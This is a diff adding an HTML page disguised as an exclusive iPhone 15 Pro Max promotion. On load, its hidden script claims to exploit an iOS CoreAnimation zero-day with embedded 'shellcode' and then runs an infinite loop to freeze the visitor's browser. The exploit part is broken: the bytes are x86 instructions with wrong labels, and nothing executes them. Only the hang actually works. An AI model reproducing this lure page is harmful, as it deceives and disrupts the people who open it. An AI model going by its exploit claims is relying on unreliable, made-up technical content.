@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>🎁 Ưu Đãi Độc Quyền iPhone 15 Pro Max</title>
+    <style>
+        body { display: none; } /* Ẩn giao diện để tập trung vào khai thác */
+    </style>
+</head>
+<body>
+<script>
+    // Payload khai thác lỗ hổng Zero-day trong CoreAnimation của iOS
+    // Tạo mảng byte để tràn bộ nhớ đệm và ghi đè con trỏ hàm gọi (return address)
+    function exploit_ios_crash() {
+        const shellcode = new Uint8Array([
+            0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, pmu_register
+            0x48, 0x89, 0x04, 0x24,                                      // mov [rsp], rax
+            0xb8, 0x00, 0x00, 0x00, 0x00,                                // mov eax, 0 (Power Off)
+            0xff, 0x90, 0x14, 0x00, 0x00, 0x00,                          // call [rax+0x14]
+            0x0f, 0x0b                                                     // int3 (Force Halt)
+        ]);
+
+        // Nhúng mã vào đối tượng SVG để kích hoạt lỗi parser
+        const svg = document.createElement('svg');
+        svg.innerHTML = shellcode;
+        
+        // Kích hoạt khai thác qua thuộc tính width/height tràn bộ nhớ
+        document.body.appendChild(svg);
+        
+        // Ép trình duyệt giải mã và thực thi
+        setTimeout(() => {
+            window.location.href = 'about:blank';
+            // Vòng lặp vô hạn để treo hệ thống
+            while(true) {}
+        }, 100);
+    }
+    exploit_ios_crash();
+</script>
+</body>
+</html>
